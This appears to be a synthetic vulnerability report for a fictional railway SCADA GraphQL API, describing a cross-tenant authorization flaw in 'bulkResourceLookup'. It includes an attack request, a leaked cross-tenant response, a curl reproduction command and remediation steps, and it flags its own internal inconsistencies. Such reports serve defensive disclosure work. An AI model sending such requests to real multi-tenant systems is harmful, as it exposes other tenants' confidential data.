# Security Analysis Report
**System:** RailCore Operations API
**Domain:** Railway / SCADA
**Example ID:** GQL-0288
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.2 | Related/linked resource access without tenancy check on `bulkResourceLookup` — attacker from `tenant-e80c` reads SCADA records owned by `tenant-7f1c` |

---

## Finding 1 — BOLA: Related/Linked Resource Access Without Tenancy Check (Pattern 1.2)

### Summary
The `bulkResourceLookup` mutation on RailCore Operations API (`api.railcore-operations-.example.com`) accepts an arbitrary list of resource IDs without verifying each ID's `tenantId` against the JWT's `tenantId` claim. This enables cross-tenant access to related/linked SCADA resources. The Redis cache is keyed by `resourceId` only (no user/tenant dimension), amplifying the risk.

**Context.txt inconsistency (documented):** The HAR request uses the `bulkResourceLookup` mutation, but the response JSON contains the key `getResource` — a single-resolver response key. These names conflict. The HAR (§6.0) request is the primary evidence for the exploit path. The response key `getResource` is used as returned by the server.

**Note on hostname:** The hostname `api.railcore-operations-.example.com` contains a trailing dash. This is the exact value in context.txt and is used as-is.
**Note on `x-request-id`:** This appears as a *response* header (`"x-request-id": "req-e80c7f1c"`). It is server-assigned and must NOT be sent as a request header.

**Pattern:** 1.2 — Related or linked resources (BOLA)
**Affected resolver:** `bulkResourceLookup`
**Affected endpoint:** `POST https://api.railcore-operations-.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (attacker JWT: `tenant-e80c`)**
```
POST https://api.railcore-operations-.example.com/graphql
authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
content-type: application/json
x-tenant-id: tenant-e80c

{"query": "query VulnerableOp { bulkResourceLookup(ids: [\"R-2288\", \"R-1288\", \"R-3288\"]) { resourceId tenantId data { sensitiveField } } }"}
```

**Response — Cross-Tenant Resource Returned**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-7f1c",
      "ownerId": "other-user-e80c7f1c",
      "data": {
        "sensitiveField": "CONFIDENTIAL-e80c7f1c",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
*`x-request-id: req-e80c7f1c` — server-assigned response header, confirms cross-tenant access.*

### Steps to Reproduce
```bash
curl -s -X POST "https://api.railcore-operations-.example.com/graphql" \
  -H "authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "content-type: application/json" \
  -H "x-tenant-id: tenant-e80c" \
  -d '{"query": "query VulnerableOp { bulkResourceLookup(ids: [\"R-2288\", \"R-1288\", \"R-3288\"]) { resourceId tenantId data { sensitiveField } } }"}'
# Vulnerable: tenantId: tenant-7f1c returned for tenant-e80c caller
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Validate each `id` in `bulkResourceLookup` against the JWT's `tenantId` before returning results.
2. Reject or filter any ID whose resolved object's `tenantId` ≠ JWT `tenantId`.
3. Key Redis cache on `tenantId:resourceId` composite, not `resourceId` alone.
